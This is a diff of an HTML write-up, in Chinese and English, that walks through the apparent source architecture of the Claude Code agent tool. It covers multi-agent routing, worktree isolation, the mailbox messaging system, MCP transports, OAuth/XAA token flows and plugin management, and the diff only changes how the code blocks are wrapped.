-<pre><code>POST /v1/code/sessions → POST /bridge (获取 JWT) → SSE + CCRClient</code></pre>
+<div class="ascii-diagram"><pre>POST /v1/code/sessions → POST /bridge (获取 JWT) → SSE + CCRClient</pre></div>
 <p>v2 移除了 Environments API 的 poll/dispatch 层，直接连接 session-ingress。</p>
 <h4 id="07-cn-h611">7.4 Spawn 模式</h4>
 <p><code>bridgeMain.ts</code> 支持三种会话目录策略:</p>
@@ -8920,15 +8931,15 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <hr/>
 <h3 id="07-cn-h614">9. Agent 内存系统</h3>
 <p><code>agentMemory.ts</code> 实现了三级持久化记忆：</p>
-<pre><code class="language-typescript">type AgentMemoryScope = 'user' | 'project' | 'local'
+<div class="ascii-diagram"><pre>type AgentMemoryScope = 'user' | 'project' | 'local'
 // user:    ~/.claude/agent-memory/&lt;agentType&gt;/    → 跨项目通用记忆
 // project: &lt;cwd&gt;/.claude/agent-memory/&lt;agentType&gt;/ → 项目级共享记忆 (可 VCS)
-// local:   &lt;cwd&gt;/.claude/agent-memory-local/&lt;agentType&gt;/ → 本地私有 (不入 VCS)</code></pre>
+// local:   &lt;cwd&gt;/.claude/agent-memory-local/&lt;agentType&gt;/ → 本地私有 (不入 VCS)</pre></div>
 <p>Agent 定义中通过 <code>memory: 'user' | 'project' | 'local'</code> frontmatter 声明使用哪个级别。系统自动在 Agent 启动时通过 <code>loadAgentMemoryPrompt()</code> 将记忆内容注入系统提示。</p>
 <hr/>
 <h3 id="07-cn-h615">10. 内置 Agent 注册表</h3>
 <p><code>builtInAgents.ts</code> 管理内置 Agent 的注册，模式取决于运行模式：</p>
-<pre><code class="language-typescript">function getBuiltInAgents(): AgentDefinition[] {
+<div class="ascii-diagram"><pre>function getBuiltInAgents(): AgentDefinition[] {
   // Coordinator 模式 → 使用 getCoordinatorAgents() (只有 worker)
   if (isCoordinatorMode()) return getCoordinatorAgents()
 
@@ -8947,7 +8958,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
     agents.push(VERIFICATION_AGENT)         // 验证 Agent
   }
   return agents
-}</code></pre>
+}</pre></div>
 <p>特殊标记 <code>ONE_SHOT_BUILTIN_AGENT_TYPES</code>: <code>Explore</code> 和 <code>Plan</code> 是一次性 Agent，不需要 agentId/SendMessage 提示的尾部信息，节省约 135 字符/次。</p>
 <hr/>
 <h3 id="07-cn-h616">总结</h3>
@@ -8972,7 +8983,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <a href="#07-en-h651" class="toc-l1">10. Built-in Agent Registry</a>
 <a href="#07-en-h652" class="toc-l1">Summary</a></nav><h3 id="07-en-h617">1. Architecture Overview</h3>
 <p>Claude Code's multi-agent collaboration system is composed of the following core modules:</p>
-<pre><code>AgentTool.tsx (900+ lines)  ─── Unified entry point, all Agent lifecycle management
+<div class="ascii-diagram"><pre>AgentTool.tsx (900+ lines)  ─── Unified entry point, all Agent lifecycle management
   ├── runAgent.ts          ─── Low-level execution engine: query() loop + MCP initialization
   ├── forkSubagent.ts      ─── Fork mode message construction &amp; caching strategy
   ├── agentToolUtils.ts    ─── Tool pool pruning, async lifecycle management
@@ -8985,7 +8996,7 @@ spawnMultiAgent.ts         ─── Teammate spawning via tmux/iTerm2/in-proces
 SendMessageTool.ts         ─── Cross-Agent message routing (local/UDS/Bridge)
 TeamCreateTool.ts          ─── Team creation &amp; TeamFile management
 worktree.ts                ─── Git Worktree isolation: create/detect changes/cleanup
-bridge/ (31 files)         ─── Remote Control REPL bridge (not for inter-Agent communication)</code></pre>
+bridge/ (31 files)         ─── Remote Control REPL bridge (not for inter-Agent communication)</pre></div>
 <hr/>
 <h3 id="07-en-h618">2. AgentTool's 6 Operating Modes</h3>
 <h4 id="07-en-h619">Mode Comparison Table</h4>
@@ -8999,7 +9010,7 @@ bridge/ (31 files)         ─── Remote Control REPL bridge (not for inter-A
 <p><tr><td><strong>Result Return</strong></td><td>Directly returns tool_result</td><td><code><task-notification></code> user message</td><td><code><task-notification></code></td><td><code><task-notification></code> + worktree path</td><td>Remote polling</td><td>mailbox</td></tr></tbody></table></p>
 <h4 id="07-en-h620">Core Routing Logic for Mode Selection</h4>
 <p>In <code>AgentTool.call()</code>, routing decisions are executed in the following priority order:</p>
-<pre><code class="language-typescript">// 1. Teammate routing (highest priority)
+<div class="ascii-diagram"><pre>// 1. Teammate routing (highest priority)
 if (teamName &amp;&amp; name) {
   return spawnTeammate({ ... })  // → tmux / in-process
 }
@@ -9020,7 +9031,7 @@ if (effectiveIsolation === 'worktree') {
 
 // 5. Sync/Async decision
 const shouldRunAsync = (run_in_background || selectedAgent.background
-  || isCoordinator || forceAsync || assistantForceAsync) &amp;&amp; !isBackgroundTasksDisabled</code></pre>
+  || isCoordinator || forceAsync || assistantForceAsync) &amp;&amp; !isBackgroundTasksDisabled</pre></div>
 <hr/>
 <h3 id="07-en-h621">3. Fork Agent's Cache Innovation</h3>
 <h4 id="07-en-h622">3.1 Core Design Goal</h4>
@@ -9044,13 +9055,13 @@ availableTools: isForkPath ? toolUseContext.options.tools : workerTools,
 <p>This is because <code>resolveAgentTools()</code> under <code>permissionMode: 'bubble'</code> produces tool definition serializations that differ from the parent's, causing cache invalidation.</p>
 <h4 id="07-en-h624">3.3 Forked Message Construction (<code>buildForkedMessages</code>)</h4>
 <p>Fork's message structure is carefully designed to maximize cache hits:</p>
-<pre><code>[...parent history messages]
+<div class="ascii-diagram"><pre>[...parent history messages]
 ├── assistant (fully preserved: all tool_use, thinking, text blocks)
 └── user
     ├── tool_result[0]: "Fork started — processing in background"  ← identical across all sub-Agents
     ├── tool_result[1]: "Fork started — processing in background"  ← identical across all sub-Agents
     ├── ...
-    └── text: "&lt;fork-boilerplate&gt;...\n&lt;fork-directive&gt;only this part differs&lt;/fork-directive&gt;"  ← sole divergence point</code></pre>
+    └── text: "&lt;fork-boilerplate&gt;...\n&lt;fork-directive&gt;only this part differs&lt;/fork-directive&gt;"  ← sole divergence point</pre></div>
 <p>Key implementation details:</p>
 <ul>
 <li><strong>Unified placeholder results</strong>: All <code>tool_result</code> entries use the same <code>FORK_PLACEHOLDER_RESULT = 'Fork started — processing in background'</code></li>
@@ -9153,16 +9164,16 @@ const workerTools = Array.from(ASYNC_AGENT_ALLOWED_TOOLS)
 <h3 id="07-en-h633">5. Team Communication Mechanism</h3>
 <h4 id="07-en-h634">5.1 SendMessage Addressing Modes</h4>
 <p><code>SendMessageTool</code> supports four addressing protocols:</p>
-<pre><code class="language-typescript">const inputSchema = z.object({
+<div class="ascii-diagram"><pre>const inputSchema = z.object({
   to: z.string()  // Addressing target
   // Supported formats:
   // "researcher"           → Address Teammate by name
   // "*"                    → Broadcast to all Teammates
   // "uds:/path/to.sock"   → Unix Domain Socket (local cross-session)
   // "bridge:session_..."   → Remote Control cross-machine communication
-})</code></pre>
+})</pre></div>
 <h4 id="07-en-h635">5.2 Complete Message Routing Decision Tree</h4>
-<pre><code>SendMessage.call(input)
+<div class="ascii-diagram"><pre>SendMessage.call(input)
 │
 ├── 1. Bridge route (feature UDS_INBOX + addr.scheme === 'bridge')
 │   └── postInterClaudeMessage(target, message)  → Cross-machine HTTP API
@@ -9182,7 +9193,7 @@ const workerTools = Array.from(ASYNC_AGENT_ALLOWED_TOOLS)
 │   └── handleBroadcast()  → Iterate teamFile.members, writeToMailbox for each
 │
 └── 5. Teammate route (default)
-    └── handleMessage()    → writeToMailbox(recipientName, ...)</code></pre>
+    └── handleMessage()    → writeToMailbox(recipientName, ...)</pre></div>
 <h4 id="07-en-h636">5.3 Mailbox Communication</h4>
 <p>Communication between Teammates is based on a filesystem mailbox:</p>
 <pre><code class="language-typescript">// Core operation in handleMessage
@@ -9196,7 +9207,7 @@ await writeToMailbox(recipientName, {
 <p>Mailbox files are stored under the team directory, with each Teammate having its own inbox. Messages are delivered automatically -- there is no need to actively check the inbox.</p>
 <h4 id="07-en-h637">5.4 tmux vs In-Process Selection Strategy</h4>
 <p>Backend detection logic in <code>spawnMultiAgent.ts</code>:</p>
-<pre><code class="language-typescript">let detectionResult = await detectAndGetBackend()
+<div class="ascii-diagram"><pre>let detectionResult = await detectAndGetBackend()
 // Detection result may include: needsIt2Setup
 
 // Backend types (BackendType):
@@ -9207,7 +9218,7 @@ await writeToMailbox(recipientName, {
 // tmux spawn flow:
 // 1. ensureSession(sessionName)        → Ensure tmux session exists
 // 2. createTeammatePaneInSwarmView()   → Create pane in swarm view
-// 3. sendCommandToPane(paneId, cmd)    → Send spawn command to pane</code></pre>
+// 3. sendCommandToPane(paneId, cmd)    → Send spawn command to pane</pre></div>
 <p><strong>Special restrictions for in-process Teammates</strong>:</p>
 <pre><code class="language-typescript">// Cannot spawn background Agents
 if (isInProcessTeammate() &amp;&amp; teamName &amp;&amp; run_in_background === true) {
@@ -9233,7 +9244,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <h3 id="07-en-h639">6. Worktree Isolation</h3>
 <h4 id="07-en-h640">6.1 Creation Flow</h4>
 <p>Complete flow of <code>createAgentWorktree(slug)</code>:</p>
-<pre><code>1. validateWorktreeSlug(slug)           → Prevent path traversal attacks
+<div class="ascii-diagram"><pre>1. validateWorktreeSlug(slug)           → Prevent path traversal attacks
 2. hasWorktreeCreateHook()?
    ├── Yes: executeWorktreeCreateHook() → User-defined VCS hook
    └── No: Git worktree flow
@@ -9247,7 +9258,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
               iii. (optional) git sparse-checkout set --cone -- &lt;paths&gt;
        c. symlinkDirectories()          → Symlink node_modules etc. to avoid disk bloat
        d. copyWorktreeIncludeFiles()    → Copy gitignored files matched by .worktreeinclude
-       e. saveCurrentProjectConfig()    → Copy CLAUDE.md and other configurations</code></pre>
+       e. saveCurrentProjectConfig()    → Copy CLAUDE.md and other configurations</pre></div>
 <h4 id="07-en-h641">6.2 Preventing Multi-Agent Git Conflicts</h4>
 <p>Worktrees prevent conflicts through the following mechanisms:</p>
 <ol>
@@ -9258,7 +9269,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <li><strong><code>findCanonicalGitRoot()</code></strong>: Ensures all worktrees are created under the main repository's <code>.claude/worktrees/</code>, rather than nested inside an existing worktree</li>
 </ol>
 <h4 id="07-en-h642">6.3 Cleanup Flow</h4>
-<pre><code class="language-typescript">async cleanupWorktreeIfNeeded(): Promise&lt;{ worktreePath?, worktreeBranch? }&gt; {
+<div class="ascii-diagram"><pre>async cleanupWorktreeIfNeeded(): Promise&lt;{ worktreePath?, worktreeBranch? }&gt; {
   // Hook-based worktree: always preserved (cannot detect VCS changes)
   if (hookBased) return { worktreePath }
 
@@ -9273,7 +9284,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
   }
   // Has changes → preserve worktree, return path and branch for user inspection
   return { worktreePath, worktreeBranch }
-}</code></pre>
+}</pre></div>
 <p><code>hasWorktreeChanges()</code> checks two dimensions:</p>
 <ul>
 <li><code>git status --porcelain</code>: Detects uncommitted modifications</li>
@@ -9316,9 +9327,9 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <p><tr><td><strong>Types</strong></td><td><code>types.ts</code></td><td>All type definitions: WorkResponse, BridgeConfig, SessionHandle, etc.</td></tr></tbody></table></p>
 <h4 id="07-en-h646">7.3 Two Generations of Architecture</h4>
 <p><strong>v1 (Env-based)</strong>: <code>replBridge.ts</code></p>
-<pre><code>Register environment → Poll for work → Acknowledge → Spawn subprocess → WebSocket communication → Heartbeat</code></pre>
+<div class="ascii-diagram"><pre>Register environment → Poll for work → Acknowledge → Spawn subprocess → WebSocket communication → Heartbeat</pre></div>
 <p><strong>v2 (Env-less)</strong>: <code>remoteBridgeCore.ts</code></p>
-<pre><code>POST /v1/code/sessions → POST /bridge (obtain JWT) → SSE + CCRClient</code></pre>
+<div class="ascii-diagram"><pre>POST /v1/code/sessions → POST /bridge (obtain JWT) → SSE + CCRClient</pre></div>
 <p>v2 removes the poll/dispatch layer of the Environments API, connecting directly to session-ingress.</p>
 <h4 id="07-en-h647">7.4 Spawn Mode</h4>
 <p><code>bridgeMain.ts</code> supports three session directory strategies:</p>
@@ -9356,15 +9367,15 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <hr/>
 <h3 id="07-en-h650">9. Agent Memory System</h3>
 <p><code>agentMemory.ts</code> implements a three-tier persistent memory system:</p>
-<pre><code class="language-typescript">type AgentMemoryScope = 'user' | 'project' | 'local'
+<div class="ascii-diagram"><pre>type AgentMemoryScope = 'user' | 'project' | 'local'
 // user:    ~/.claude/agent-memory/&lt;agentType&gt;/    → Cross-project universal memory
 // project: &lt;cwd&gt;/.claude/agent-memory/&lt;agentType&gt;/ → Project-level shared memory (VCS-trackable)
-// local:   &lt;cwd&gt;/.claude/agent-memory-local/&lt;agentType&gt;/ → Local private (not in VCS)</code></pre>
+// local:   &lt;cwd&gt;/.claude/agent-memory-local/&lt;agentType&gt;/ → Local private (not in VCS)</pre></div>
 <p>Agent definitions declare which level to use via the <code>memory: 'user' | 'project' | 'local'</code> frontmatter. The system automatically injects memory content into the system prompt via <code>loadAgentMemoryPrompt()</code> when the Agent starts.</p>
 <hr/>
 <h3 id="07-en-h651">10. Built-in Agent Registry</h3>
 <p><code>builtInAgents.ts</code> manages built-in Agent registration, with the pattern depending on the operating mode:</p>
-<pre><code class="language-typescript">function getBuiltInAgents(): AgentDefinition[] {
+<div class="ascii-diagram"><pre>function getBuiltInAgents(): AgentDefinition[] {
   // Coordinator mode → use getCoordinatorAgents() (worker only)
   if (isCoordinatorMode()) return getCoordinatorAgents()
 
@@ -9383,7 +9394,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
     agents.push(VERIFICATION_AGENT)         // Verification Agent
   }
   return agents
-}</code></pre>
+}</pre></div>
 <p>Special marker <code>ONE_SHOT_BUILTIN_AGENT_TYPES</code>: <code>Explore</code> and <code>Plan</code> are one-shot Agents that do not need the agentId/SendMessage prompt in the trailing info, saving approximately 135 characters per invocation.</p>
 <hr/>
 <h3 id="07-en-h652">Summary</h3>
@@ -9464,11 +9475,11 @@ export function createLinkedTransportPair(): [Transport, Transport] {
 </ol>
 <h4 id="08-cn-h658">1.4 特殊传输：SdkControlTransport</h4>
 <p>SDK 传输桥接实现了 CLI 进程与 SDK 进程间的 MCP 通信：</p>
-<pre><code>CLI → SDK: SdkControlClientTransport.send() → 控制消息(stdout) → SDK StructuredIO → 路由到对应server
-SDK → CLI: MCP server → SdkControlServerTransport.send() → callback → 控制消息解析 → onmessage</code></pre>
+<div class="ascii-diagram"><pre>CLI → SDK: SdkControlClientTransport.send() → 控制消息(stdout) → SDK StructuredIO → 路由到对应server
+SDK → CLI: MCP server → SdkControlServerTransport.send() → callback → 控制消息解析 → onmessage</pre></div>
 <p>关键设计：<code>SdkControlClientTransport</code> 通过 <code>sendMcpMessage</code> 回调将 JSONRPC 消息包装为控制请求（含 <code>server_name</code> 和 <code>request_id</code>），SDK 端的 StructuredIO 负责路由和响应关联。</p>
 <h4 id="08-cn-h659">1.5 连接状态机</h4>
-<pre><code>         ┌─────────┐
+<div class="ascii-diagram"><pre>         ┌─────────┐
          │ pending  │ ←──── 初始 / 重连
          └────┬─────┘
               │ connectToServer()
@@ -9484,7 +9495,7 @@ SDK → CLI: MCP server → SdkControlServerTransport.send() → callback → �
      ▼          ▼           ▼
 ┌──────────┐ ┌─────────┐ ┌─────────┐
 │needs-auth│ │ pending │ │connected│
-└──────────┘ └─────────┘ └─────────┘</code></pre>
+└──────────┘ └─────────┘ └─────────┘</pre></div>
 <p>五种状态通过 TypeScript 联合类型严格定义：</p>
 <pre><code class="language-typescript">export type MCPServerConnection =
   | ConnectedMCPServer    // client + capabilities + cleanup
@@ -9512,7 +9523,7 @@ function getRemoteMcpServerConnectionBatchSize(): number {
 <h3 id="08-cn-h661">二、API 客户端深度</h3>
 <h4 id="08-cn-h662">2.1 getAnthropicClient：4 种后端</h4>
 <p><code>services/api/client.ts</code> 的 <code>getAnthropicClient()</code> 是 API 访问的统一入口，通过环境变量选择后端：</p>
-<pre><code class="language-typescript">export async function getAnthropicClient({ apiKey, maxRetries, model, fetchOverride, source }) {
+<div class="ascii-diagram"><pre>export async function getAnthropicClient({ apiKey, maxRetries, model, fetchOverride, source }) {
   // 公共参数
   const ARGS = { defaultHeaders, maxRetries, timeout: 600_000, dangerouslyAllowBrowser: true, ... }
 
@@ -9540,7 +9551,7 @@ function getRemoteMcpServerConnectionBatchSize(): number {
     authToken: isClaudeAISubscriber() ? getClaudeAIOAuthTokens()?.accessToken : undefined,
     ...ARGS,
   })
-}</code></pre>
+}</pre></div>
 <p>关键细节：</p>
 <ul>
 <li><strong>所有后端的 maxRetries 在 SDK 层设为 0</strong>，重试逻辑由 <code>withRetry.ts</code> 统一管理</li>
@@ -9597,7 +9608,7 @@ for await (const message of withStreamingVCR(messages, async function* () {
 <hr/>
 <h3 id="08-cn-h666">三、OAuth PKCE 完整流程</h3>
 <h4 id="08-cn-h667">3.1 标准 MCP OAuth 流程（auth.ts: performMCPOAuthFlow）</h4>
-<pre><code>用户发起 /mcp 认证
+<div class="ascii-diagram"><pre>用户发起 /mcp 认证
        │
        ▼
 [1] 检查 oauth.xaa → 是 → 走 XAA 流程（见下节）
@@ -9634,10 +9645,10 @@ for await (const message of withStreamingVCR(messages, async function* () {
     存储结构: mcpOAuth[serverKey] = {
       serverName, serverUrl, accessToken, refreshToken,
       expiresAt, scope, clientId, clientSecret, discoveryState
-    }</code></pre>
+    }</pre></div>
 <h4 id="08-cn-h668">3.2 Token 刷新</h4>
 <p><code>ClaudeAuthProvider</code> 实现 <code>OAuthClientProvider</code> 接口，<code>tokens()</code> 方法在每次 MCP 请求时被调用：</p>
-<pre><code>ClaudeAuthProvider.tokens()
+<div class="ascii-diagram"><pre>ClaudeAuthProvider.tokens()
     │
     ├── 检查 accessToken 是否过期
     │   ├── 未过期 → 返回 { access_token, refresh_token }
@@ -9653,9 +9664,9 @@ for await (const message of withStreamingVCR(messages, async function* () {
     └── XAA 路径: xaaRefresh()
         ├── 检查 IdP id_token 缓存
         ├── performCrossAppAccess() (不弹浏览器)
-        └── 保存新 tokens</code></pre>
+        └── 保存新 tokens</pre></div>
 <h4 id="08-cn-h669">3.3 Step-Up Authentication</h4>
-<pre><code class="language-typescript">// auth.ts: wrapFetchWithStepUpDetection
+<div class="ascii-diagram"><pre>// auth.ts: wrapFetchWithStepUpDetection
 export function wrapFetchWithStepUpDetection(baseFetch, provider): FetchLike {
   return async (url, init) =&gt; {
     const response = await baseFetch(url, init)
@@ -9667,13 +9678,13 @@ export function wrapFetchWithStepUpDetection(baseFetch, provider): FetchLike {
     }
     return response
   }
-}</code></pre>
+}</pre></div>
 <hr/>
 <h3 id="08-cn-h670">四、MCP OAuth XAA（跨应用访问）</h3>
 <h4 id="08-cn-h671">4.1 架构概述</h4>
 <p>XAA (Cross-App Access / SEP-990) 实现了<strong>一次 IdP 登录，N 个 MCP 服务器静默认证</strong>的能力。核心在 <code>xaa.ts</code> 和 <code>xaaIdpLogin.ts</code>。</p>
 <h4 id="08-cn-h672">4.2 完整 XAA 流程</h4>
-<pre><code>[配置] settings.xaaIdp = { issuer, clientId, callbackPort? }
+<div class="ascii-diagram"><pre>[配置] settings.xaaIdp = { issuer, clientId, callbackPort? }
 [配置] server.oauth = { clientId, xaa: true }
 [配置] keychain: mcpOAuthClientConfig[serverKey].clientSecret
 
@@ -9719,12 +9730,12 @@ performMCPXaaAuth(serverName, serverConfig)
     │
     ▼
 [3] 保存 tokens 到 keychain (mcpOAuth[serverKey])
-    包含 discoveryState.authorizationServerUrl 用于后续刷新</code></pre>
+    包含 discoveryState.authorizationServerUrl 用于后续刷新</pre></div>
 <h4 id="08-cn-h673">4.3 XAA 错误处理的精细分类</h4>
-<pre><code class="language-typescript">// XaaTokenExchangeError 携带 shouldClearIdToken 标记
+<div class="ascii-diagram"><pre>// XaaTokenExchangeError 携带 shouldClearIdToken 标记
 // 4xx / invalid_grant → id_token 无效，清除缓存
 // 5xx → IdP 宕机，id_token 可能仍有效，保留
-// 200 + 非法 body → 协议违规，清除</code></pre>
+// 200 + 非法 body → 协议违规，清除</pre></div>
 <p>XAA 对敏感信息（token、assertion、client_secret）在日志中做了严格脱敏：</p>
 <pre><code class="language-typescript">const SENSITIVE_TOKEN_RE =
   /"(access_token|refresh_token|id_token|assertion|subject_token|client_secret)"\s*:\s*"[^"]*"/g
@@ -9746,7 +9757,7 @@ function redactTokens(raw) {
 </ol>
 <h4 id="08-cn-h676">5.2 去重策略</h4>
 <p>三层去重防止同一 MCP 服务器重复连接：</p>
-<pre><code class="language-typescript">// 1. 插件 vs 手动配置去重
+<div class="ascii-diagram"><pre>// 1. 插件 vs 手动配置去重
 dedupPluginMcpServers(pluginServers, manualServers)
 // 签名比较: stdio → "stdio:" + JSON(commandArray)
 //           remote → "url:" + unwrapCcrProxyUrl(url)
@@ -9756,16 +9767,16 @@ dedupClaudeAiMcpServers(claudeAiServers, manualServers)
 // 仅用启用的手动服务器作为去重目标
 
 // 3. CCR 代理 URL 解包
-unwrapCcrProxyUrl(url) // 提取 mcp_url 查询参数中的原始供应商 URL</code></pre>
+unwrapCcrProxyUrl(url) // 提取 mcp_url 查询参数中的原始供应商 URL</pre></div>
 <h4 id="08-cn-h677">5.3 企业策略（Allowlist / Denylist）</h4>
-<pre><code class="language-typescript">// Denylist 绝对优先 — 三种匹配方式
+<div class="ascii-diagram"><pre>// Denylist 绝对优先 — 三种匹配方式
 isMcpServerDenied(name, config)
   ├── isMcpServerNameEntry(entry)    // 按名称
   ├── isMcpServerCommandEntry(entry) // 按命令数组（stdio）
   └── isMcpServerUrlEntry(entry)     // 按 URL 通配符模式
 
 // Allowlist — allowManagedMcpServersOnly 时仅用 policySettings
-isMcpServerAllowedByPolicy(name, config)</code></pre>
+isMcpServerAllowedByPolicy(name, config)</pre></div>
 <hr/>
 <h3 id="08-cn-h678">六、插件架构</h3>
 <h4 id="08-cn-h679">6.1 目录结构</h4>
@@ -9774,7 +9785,7 @@ isMcpServerAllowedByPolicy(name, config)</code></pre>
   pluginOperations.ts           — 增删改操作
   pluginCliCommands.ts          — CLI 命令接口</code></pre>
 <h4 id="08-cn-h680">6.2 Marketplace 与插件生命周期</h4>
-<pre><code>启动时:
+<div class="ascii-diagram"><pre>启动时:
   loadAllPluginsCacheOnly()     ← 仅从缓存加载（不阻塞启动）
 后台:
   performBackgroundPluginInstallations()
@@ -9786,7 +9797,7 @@ isMcpServerAllowedByPolicy(name, config)</code></pre>
 
 安装完成后:
   ├── refreshActivePlugins() → 重新加载插件
-  └── 或 needsRefresh → 显示通知提示 /reload-plugins</code></pre>
+  └── 或 needsRefresh → 显示通知提示 /reload-plugins</pre></div>
 <h4 id="08-cn-h681">6.3 插件如何提供 MCP 服务器</h4>
 <p>插件通过 <code>getPluginMcpServers()</code> 注入 MCP 服务器配置。插件服务器的命名空间为 <code>plugin:<name>:<server></code>，不会与手动配置键冲突。但内容去重（<code>dedupPluginMcpServers</code>）会检测相同 command/url 的重复。</p>
 <p>每个插件 MCP 服务器配置上附带 <code>pluginSource</code> 字段（如 <code>'slack@anthropic'</code>），用于 channel 权限控制时的快速查找，无需等待 <code>AppState.plugins.enabled</code> 异步加载完成。</p>
@@ -9835,7 +9846,7 @@ export function getMCPSkillBuilders(): MCPSkillBuilders {
 }</code></pre>
 <p>这个模式解决了循环依赖问题：<code>client.ts → mcpSkills.ts → loadSkillsDir.ts → ... → client.ts</code>。通过将 builders 注册延迟到模块初始化时（<code>loadSkillsDir.ts</code> 通过 <code>commands.ts</code> 的静态导入在启动时被 eagerly 求值），保证 MCP 服务器连接时 builders 已就绪。</p>
 <h4 id="08-cn-h686">7.4 Markdown 技能文件格式</h4>
-<pre><code class="language-markdown">---
+<div class="ascii-diagram"><pre>---
 description: 技能描述文本
 when-to-use: 触发条件描述
 argument-hint: 参数提示
@@ -9850,7 +9861,7 @@ hooks:
 
 ### 技能 Prompt 内容
 
-实际的 system prompt 文本...</code></pre>
+实际的 system prompt 文本...</pre></div>
 <p>前置数据由 <code>parseFrontmatter()</code> 解析，支持：</p>
 <ul>
 <li><code>allowed-tools</code>：限制技能可用的工具列表</li>
@@ -9877,7 +9888,7 @@ hooks:
 <li><code>call</code>: 封装 <code>client.callTool()</code> + 超时 + 结果格式化 + 图片处理</li>
 </ul>
 <h4 id="08-cn-h689">8.2 工具调用链</h4>
-<pre><code>LLM 输出 tool_use(name="mcp__github__create_issue", input={...})
+<div class="ascii-diagram"><pre>LLM 输出 tool_use(name="mcp__github__create_issue", input={...})
     │
     ▼
 MCPTool.call(input)
@@ -9894,7 +9905,7 @@ MCPTool.call(input)
     │   ├── 大型输出: truncateMcpContentIfNeeded()
     │   └── 二进制: persistBinaryContent() → 保存到磁盘
     │
-    └── 返回格式化文本结果</code></pre>
+    └── 返回格式化文本结果</pre></div>
 <hr/>
 <h3 id="08-cn-h690">九、Channel Notifications（MCP 推送消息）</h3>
 <p>Channel 通知让 MCP 服务器（如 Discord/Slack/Telegram 机器人）向对话推送消息：</p>
@@ -10006,11 +10017,11 @@ export function createLinkedTransportPair(): [Transport, Transport] {
 </ol>
 <h4 id="08-en-h703">1.4 Special Transport: SdkControlTransport</h4>
 <p>The SDK transport bridge implements MCP communication between the CLI process and SDK process:</p>
-<pre><code>CLI → SDK: SdkControlClientTransport.send() → control message (stdout) → SDK StructuredIO → route to corresponding server
-SDK → CLI: MCP server → SdkControlServerTransport.send() → callback → control message parsing → onmessage</code></pre>
+<div class="ascii-diagram"><pre>CLI → SDK: SdkControlClientTransport.send() → control message (stdout) → SDK StructuredIO → route to corresponding server
+SDK → CLI: MCP server → SdkControlServerTransport.send() → callback → control message parsing → onmessage</pre></div>
 <p>Key design: <code>SdkControlClientTransport</code> wraps JSONRPC messages as control requests (containing <code>server_name</code> and <code>request_id</code>) through the <code>sendMcpMessage</code> callback. The SDK-side StructuredIO handles routing and response correlation.</p>
 <h4 id="08-en-h704">1.5 Connection State Machine</h4>
-<pre><code>         ┌─────────┐
+<div class="ascii-diagram"><pre>         ┌─────────┐
          │ pending  │ ←──── initial / reconnect
          └────┬─────┘
               │ connectToServer()
@@ -10026,7 +10037,7 @@ SDK → CLI: MCP server → SdkControlServerTransport.send() → callback → co
      ▼          ▼           ▼
 ┌──────────┐ ┌─────────┐ ┌─────────┐
 │needs-auth│ │ pending │ │connected│
-└──────────┘ └─────────┘ └─────────┘</code></pre>
+└──────────┘ └─────────┘ └─────────┘</pre></div>
 <p>Five states are strictly defined through TypeScript union types:</p>
 <pre><code class="language-typescript">export type MCPServerConnection =
   | ConnectedMCPServer    // client + capabilities + cleanup
@@ -10054,7 +10065,7 @@ function getRemoteMcpServerConnectionBatchSize(): number {
 <h3 id="08-en-h706">2. API Client Deep Dive</h3>
 <h4 id="08-en-h707">2.1 getAnthropicClient: 4 Backends</h4>
 <p><code>getAnthropicClient()</code> in <code>services/api/client.ts</code> is the unified entry point for API access, selecting the backend via environment variables:</p>
-<pre><code class="language-typescript">export async function getAnthropicClient({ apiKey, maxRetries, model, fetchOverride, source }) {
+<div class="ascii-diagram"><pre>export async function getAnthropicClient({ apiKey, maxRetries, model, fetchOverride, source }) {
   // Common parameters
   const ARGS = { defaultHeaders, maxRetries, timeout: 600_000, dangerouslyAllowBrowser: true, ... }
 
@@ -10082,7 +10093,7 @@ function getRemoteMcpServerConnectionBatchSize(): number {
     authToken: isClaudeAISubscriber() ? getClaudeAIOAuthTokens()?.accessToken : undefined,
     ...ARGS,
   })
-}</code></pre>
+}</pre></div>
 <p>Key details:</p>
 <ul>
 <li><strong>maxRetries is set to 0 at the SDK layer for all backends</strong>; retry logic is centrally managed by <code>withRetry.ts</code></li>
@@ -10139,7 +10150,7 @@ for await (const message of withStreamingVCR(messages, async function* () {
 <hr/>
 <h3 id="08-en-h711">3. OAuth PKCE Complete Flow</h3>
 <h4 id="08-en-h712">3.1 Standard MCP OAuth Flow (auth.ts: performMCPOAuthFlow)</h4>
-<pre><code>User initiates /mcp authentication
+<div class="ascii-diagram"><pre>User initiates /mcp authentication
        │
        ▼
 [1] Check oauth.xaa → yes → go to XAA flow (see next section)
@@ -10176,10 +10187,10 @@ for await (const message of withStreamingVCR(messages, async function* () {
     Storage structure: mcpOAuth[serverKey] = {
       serverName, serverUrl, accessToken, refreshToken,
       expiresAt, scope, clientId, clientSecret, discoveryState
-    }</code></pre>
+    }</pre></div>
 <h4 id="08-en-h713">3.2 Token Refresh</h4>
 <p><code>ClaudeAuthProvider</code> implements the <code>OAuthClientProvider</code> interface, and its <code>tokens()</code> method is called with every MCP request:</p>
-<pre><code>ClaudeAuthProvider.tokens()
+<div class="ascii-diagram"><pre>ClaudeAuthProvider.tokens()
     │
     ├── Check if accessToken is expired
     │   ├── Not expired → return { access_token, refresh_token }
@@ -10195,9 +10206,9 @@ for await (const message of withStreamingVCR(messages, async function* () {
     └── XAA path: xaaRefresh()
         ├── Check IdP id_token cache
         ├── performCrossAppAccess() (no browser popup)
-        └── Save new tokens</code></pre>
+        └── Save new tokens</pre></div>
 <h4 id="08-en-h714">3.3 Step-Up Authentication</h4>
-<pre><code class="language-typescript">// auth.ts: wrapFetchWithStepUpDetection
+<div class="ascii-diagram"><pre>// auth.ts: wrapFetchWithStepUpDetection
 export function wrapFetchWithStepUpDetection(baseFetch, provider): FetchLike {
   return async (url, init) =&gt; {
     const response = await baseFetch(url, init)
@@ -10209,13 +10220,13 @@ export function wrapFetchWithStepUpDetection(baseFetch, provider): FetchLike {
     }
     return response
   }
